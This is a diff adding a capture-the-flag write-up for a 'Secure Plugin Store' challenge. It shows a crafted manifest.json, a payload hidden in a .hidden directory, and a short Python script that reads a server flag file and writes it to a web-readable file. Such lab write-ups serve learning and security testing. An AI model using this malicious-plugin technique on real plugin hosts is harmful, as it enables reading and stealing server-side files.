@@ -117,4 +117,104 @@ since most REST api use Bearer token :
 BOOM!
 
 ---
+### Secure Plugin Store (300 points)
+
+![](/images/Screenshot_2026-07-08_19-51-45.png)
+
+This is a **malicious plugin upload attack** that leads to **server-side file read / data exfiltration**.
+
+The main vulnerablility is untrusted plugin with weak sandboxing.
+
+So let's do exploitation
+
+![](/images/Screenshot_2026-07-08_20-04-05.png)
+
+There is a plugin upload function. So try to upload a simple zip file.
+
+![](/images/Screenshot_2026-07-08_20-14-06.png)
+
+response: **No manifest file found (requires manifest.json)**
+
+So we need manifest.json file in the plugin. I search what is manifest.json and how it structures
+
+and i found that 
+
+**The `manifest.json` file is a core configuration document used across various software platforms. It acts as an instruction manual, providing the system or browser with essential metadata and setup rules on how to launch, display, and run an application**
+
+So here is my simple manifest :
+
+```json
+{
+  "manifest_version": 3,
+  "name": "pwn",
+  "author": "test",
+  "version": "1.0.0",
+  "description": "simple test plugin",
+  "background": {
+    "service_worker": "payload.py"
+  }
+}
+```
+
+zipped it and upload it , 
+
+![](/images/Screenshot_2026-07-08_20-25-20.png)
+
+So the plugin upload is successful now, then we don't know where to call that manifest.json file. So same as always  , let's do directory fuzzing.....
+
+![](/images/Screenshot_2026-07-08_20-34-41.png)
+
+Got one dir, try further fuzzing that api....
+
+![](/images/Screenshot_2026-07-08_20-35-53.png)
+
+now we got three dir, and we can call manifest.json file at
+
+```
+ http://187.127.100.53:9000/api/plugin/a6a062f9-e036-49ef-98c7-9bb47152ce45/manifest.json
+```
+
+So what we gonna do now. The challenge's hint says that the flag file is at /opt/app/instance/flag.txt.
+
+we have to put our exploit payload file with manifest.json together in the plugin. But putting the payload file normally doesn't work. So we need to hide it in a hidden directory.
+
+```
+upload.zip
+├── manifest.json
+└── .hidden/
+    └── payload.py
+```
+
+and the last hint says after reading the flag, we have to output the flag content in the /xxx/xxx/xxx-xxx-xxx/xxx.xx
+
+that means the output file should be at
+
+```
+ /api/plugin/a6a062f9-e036-49ef-98c7-9bb47152ce45/outputfile.json
+```
+
+So the python exploit code is 
+
+```python
+import base64
+from pathlib import Path
+
+p = Path(__file__).resolve().parent.parent
+flag = Path("/opt/app/instance/flag.txt").read_text().strip()
+
+(p / "result.json").write_text(
+    "{\"flag\":\"" +
+    base64.b64encode(flag.encode()).decode() +
+    "\"}"
+)
+```
+
+Upload it and read the flag, 
+
+![](/images/Screenshot_2026-07-08_20-49-56.png)
+
+![](/images/Screenshot_2026-07-08_20-50-41.png)
+
+BOOM!
+
 
